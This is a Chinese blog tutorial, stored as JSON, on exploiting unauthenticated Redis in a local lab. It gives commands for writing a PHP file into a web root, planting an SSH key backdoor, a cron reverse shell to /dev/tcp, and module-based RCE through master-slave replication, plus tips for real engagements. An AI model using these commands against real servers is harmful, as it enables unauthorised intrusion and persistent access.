{"title":"Redis未授权访问","slug":"redis未授权访问","date":"2021-02-22T16:04:48.000Z","updated":"2021-02-23T14:38:12.986Z","comments":true,"path":"api/articles/redis未授权访问.json","photos":[],"link":"","excerpt":null,"covers":["../static/images/image-20210223223810960.png","../static/images/image-20210223223746312.png"],"content":"<h1 id=\"nginxphpredis环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#nginxphpredis环境搭建\"></a> Nginx+PHP+Redis环境搭建</h1>\n<p>环境搭建于arch，利用aur搭建的所以比较方便，系统不一样的请自行修改搭建步骤（也不难，这里记录下只是为了给下次省时间，其实主要还是改配置文件费时间，不同系统一样的）</p>\n<p>Nginx环境搭建：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yay -S nginx</span><br></pre></td></tr></table></figure>\n<p>修改配置文件/etc/nginx/nginx.conf的server部分为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name foo.com;</span><br><span class=\"line\"></span><br><span class=\"line\">    root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class=\"line\">    index index.html index.htm index.php;</span><br><span class=\"line\"></span><br><span class=\"line\">    location &#x2F; &#123;</span><br><span class=\"line\">        try_files $uri $uri&#x2F; &#x2F;index.php$is_args$args;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location ~ \\.php$ &#123;</span><br><span class=\"line\">        try_files $uri &#x3D;404;</span><br><span class=\"line\"></span><br><span class=\"line\">        include fastcgi.conf;</span><br><span class=\"line\">        fastcgi_pass 127.0.0.1:9001;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改完配置文件后，启动nginx:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable nginx.service --now</span><br></pre></td></tr></table></figure>\n<p>php环境搭建：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yay -S php php-fpm</span><br></pre></td></tr></table></figure>\n<p>修改php-fpm配置文件/etc/php/php-fpm.d/www.conf（不同php版本该配置文件不同，具体可自行查看etc目录有关于php的目录，大概是这个形式的路径，php那里可能是php7.0之类的）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pm.status_listen &#x3D; 127.0.0.1:9001 #把这一行的注释取消掉，这里有可能是9000，那就把这改成9001 或者把上面nginx配置文件那里的9001改成9000</span><br></pre></td></tr></table></figure>\n<p>修改完配置文件后，启动php-fpm</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable php-fpm --now</span><br></pre></td></tr></table></figure>\n<p>redis环境搭建并运行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-6.0.8.tar.gz</span><br><span class=\"line\">tar -xzf redis-6.0.8.tar.gz</span><br><span class=\"line\">cd redis-6.0.8</span><br><span class=\"line\">make</span><br><span class=\"line\">cd src</span><br><span class=\"line\">.&#x2F;redis-server</span><br></pre></td></tr></table></figure>\n<h1 id=\"写入webshell\"><a class=\"markdownIt-Anchor\" href=\"#写入webshell\"></a> 写入webshell</h1>\n<p>必要条件：</p>\n<ul>\n<li>知道web目录的绝对路径</li>\n<li>拥有web目录的写入权限</li>\n</ul>\n<p>思路：获取所有键值对，然后创建一个不存在的键值对，再通过修改配置文件，将该键值对写入配置文件中：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; keys *\t\t#查看所有键值对</span><br><span class=\"line\">1) &quot;mylist&quot;</span><br><span class=\"line\">2) &quot;myset&quot;</span><br><span class=\"line\">3) &quot;youset&quot;</span><br><span class=\"line\">4) &quot;user:001&quot;</span><br><span class=\"line\">5) &quot;myKey&quot;</span><br><span class=\"line\">6) &quot;age&quot;</span><br><span class=\"line\">7) &quot;user_id&quot;</span><br><span class=\"line\">8) &quot;mynum&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; config get dbfilename \t#查看配置文件</span><br><span class=\"line\">1) &quot;dbfilename&quot;</span><br><span class=\"line\">2) &quot;dump.rdb&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; config get dir \t\t\t#查看当前文件名</span><br><span class=\"line\">251) &quot;dir&quot;</span><br><span class=\"line\">252) &quot;&#x2F;home&#x2F;b0ring&#x2F;WorkingSpace&#x2F;tools&#x2F;websecurity&#x2F;vulhub&#x2F;redis&#x2F;redis-6.0.8&#x2F;src&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dir &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \t\t\t#设置当前目录为web目录</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dbfilename 1.php\t\t\t\t\t\t#设置配置文件名为shell文件</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; set shell &quot;\\n&lt;?php\\n  phpinfo();\\n?&gt;\\n&quot;\t\t\t#创建shell</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; save\t\t\t\t\t\t\t\t\t\t\t#写入shell</span><br><span class=\"line\">OK</span><br></pre></td></tr></table></figure>\n<p>此时web目录中已经生成了1.php文件，包含php内容：</p>\n<p><img src=\"../static/images/image-20210223223810960.png\" alt=\"image-20210223223810960\" /></p>\n<p>访问shell：</p>\n<p><img src=\"../static/images/image-20210223223746312.png\" alt=\"image-20210223223746312\" /></p>\n<h1 id=\"写入ssh公钥\"><a class=\"markdownIt-Anchor\" href=\"#写入ssh公钥\"></a> 写入ssh公钥</h1>\n<p>必要条件：</p>\n<ul>\n<li>知道当前用户的用户名</li>\n<li>拥有.ssh目录</li>\n<li>允许使用密钥登录</li>\n</ul>\n<p>步骤：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dir &#x2F;home&#x2F;b0ring&#x2F;.ssh</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dbfilename authorized_keys</span><br><span class=\"line\">127.0.0.1:6379&gt; set backdoor &quot;\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXyLoi1XDQtUJN2ifZfZcR0p3OT73s2ZZkOMqzSwcDGFZnTMJuR2vHbktVPWuYSAx0CmOdmkgaVDjGsn+G9e01aedRxc2lFBFMyAI2AgV&#x2F;ukY5q2kU5+x7kZD3X8KEfJ0+FsDNwtnRureYCWkh9+QuD1rlGD7IuDcAkzZYUmNREnh7Bz4Of855SF5pXdotVmsNJ3O9PF94G0zCMxCMddFNWD8Ebshk3iwZ9xk9d6NnA8qO18QMjoNQBEoQVq&#x2F;e1mdKVmaXW7CjKUva&#x2F;aZQ7kk4SjSGmvJEsIh8nb264rX0fgpIPlpHZbn5hWhdxbT3qWwHprzI90Blwa6jqNLJV91kDDDwEXywq8RZkzdkLd8G6Rwu855uKT+hkSl49Zjj8v&#x2F;XNNhboAaOgGe0sfYtbOmOdW0+FJL5ktvLt91&#x2F;oFHOvgNHTMdHgo+ASM8jdsckPo1n4ZovN2QHQpohfLFhSC1PXIpwRxf5D1Om1NAeY&#x2F;pPtNFwcDGPRZUx6PndRUQrcGc&#x3D; b0ring@b0ring\\n&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>\n<p>然后就直接用私钥登录：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -i backdoor b0ring@127.0.0.1</span><br></pre></td></tr></table></figure>\n<h1 id=\"写计划任务反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#写计划任务反弹shell\"></a> 写计划任务反弹shell</h1>\n<p>必要条件：</p>\n<ul>\n<li>拥有计划任务写权限</li>\n</ul>\n<p>服务器上监听8000端口：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp 8000</span><br></pre></td></tr></table></figure>\n<p>随后写入计划任务：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; config dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class=\"line\">127.0.0.1:6379&gt; config set dbfilename b0ring</span><br><span class=\"line\">127.0.0.1:6379&gt; set backdoor &quot;\\n\\nSHELL&#x3D;&#x2F;bin&#x2F;bash\\n\\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;8000 0&gt;&amp;1\\n\\n&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>\n<h1 id=\"主从rce\"><a class=\"markdownIt-Anchor\" href=\"#主从rce\"></a> 主从RCE</h1>\n<p>必要条件：</p>\n<ul>\n<li>redis版本为 4.x或5.x（亲测6.x无此问题）</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">从服务器会向主服务器发出SYNC指令，当主服务器接到此命令后，就会调用BGSAVE指令来创建一个子进程专门进行数据持久化工作，也就是将主服务器的数据写入RDB文件中。在数据持久化期间，主服务器将执行的写指令都缓存在内存中。</span><br><span class=\"line\"></span><br><span class=\"line\">在BGSAVE指令执行完成后，主服务器会将持久化好的RDB文件发送给从服务器，从服务器接到此文件后会将其存储到磁盘上，然后再将其读取到内存中。这个动作完成后，主服务器会将这段时间缓存的写指令再以redis协议的格式发送给从服务器。</span><br></pre></td></tr></table></figure>\n<p>自redis 4.x版本后，它可以自由添加模块扩展，只需启动时添加loadmodule选项，或者在启动后，可以rce的版本可从下面<a href=\"https://github.com/UnnameBao/RedisModules-ExecuteCommand\">链接</a>编译：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; MODULE LOAD &#x2F;home&#x2F;b0ring&#x2F;WorkingSpace&#x2F;tools&#x2F;websecurity&#x2F;vulhub&#x2F;redis&#x2F;redis-rce&#x2F;exp.so</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; MODULE list</span><br><span class=\"line\">1) 1) &quot;name&quot;</span><br><span class=\"line\">   2) &quot;system&quot;</span><br><span class=\"line\">   3) &quot;ver&quot;</span><br><span class=\"line\">   4) (integer) 1</span><br><span class=\"line\">127.0.0.1:6379&gt; system.exec whoami</span><br><span class=\"line\">&quot;b0ring\\n&quot;</span><br></pre></td></tr></table></figure>\n<p>利用上述两个特点，可以使用主从同步和修改配置文件存放位置，主服务器可以向从服务器写一个恶意的so文件，添加到redis中从而rce（6.x版本无法利用是因为6.x版本redis在加载模块时会校验模块是否具有执行权限，否则不予加载），利用脚本可从<a href=\"https://github.com/Ridter/redis-rce\">此处</a>获取。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python redis-rce.py -L 127.0.0.1 -r 127.0.0.1 -f exp.so</span><br></pre></td></tr></table></figure>\n<h1 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\"></a> 总结</h1>\n<ul>\n<li>本质上，其实这些未授权访问都是先修改redis目录和缓存文件位置，然后再保存缓存，从而通过向特定目录进行任意写操作来获取rce权限</li>\n<li>一切写操作都是覆盖的，所以实战利用过程中为了不对目标机器进行破坏，一定要先改位置再写入，然后再改回去</li>\n<li>除了主从复制，其他写操作都是有乱码的，对于Ubuntu环境，其不允许计划任务文件存在乱码，即无法再Ubuntu中使用计划任务rce</li>\n</ul>\n","categories":[],"tags":[{"name":"web","slug":"web","count":1,"path":"api/tags/web.json"}]}